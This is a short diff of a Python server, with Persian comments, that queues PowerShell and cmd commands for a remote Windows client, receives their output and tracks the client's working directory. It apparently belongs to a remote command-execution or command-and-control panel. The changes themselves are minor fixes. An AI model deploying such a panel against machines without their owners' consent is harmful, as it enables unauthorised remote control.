@@ -75,7 +75,10 @@ def save_command():
     # max_id = profile.last_seen_inbox_id
     new_id = max_id + 1
 
-    # اضافه کردن دستور جدید (با id جدید)
+    if command_type == 'ps' and command == 'pwd':
+        command_type = 'cmd'
+        command = 'cd'
+
     profile.inbox = (profile.inbox or []) + [{
         'id': new_id,
         'type': command_type,
@@ -141,7 +144,6 @@ def inbox_send(token):
             if msg.get('id') == msg_id and msg.get('type') == msg_type:
                 if 'info' not in msg or not msg['info']:
                     msg['info'] = msg_info or ""
-                    print("***   OK   ***")
                     message_updated = True
                     break
 
@@ -155,7 +157,7 @@ def inbox_send(token):
 
             # اگر info شامل درایو و بک‌اسلش باشه → مسیر جدیده
             info_text = msg_info.strip() if msg_info else ""
-            if msg.get('type') == 'cmd' and len(info_text) > 2 and info_text[1] == ':' and '\\' in info_text:
+            if msg.get('type') == 'cmd' and len(info_text) > 2 and info_text[1] == ':' and '\\' in info_text and msg.get('msg', '').startswith('cd'):  
                 profile.current_directory = info_text.rstrip('\\') + '\\'  # نرمال‌سازی
                 print(f"[+] Current directory updated: {profile.current_directory}")
                 db.session.commit()
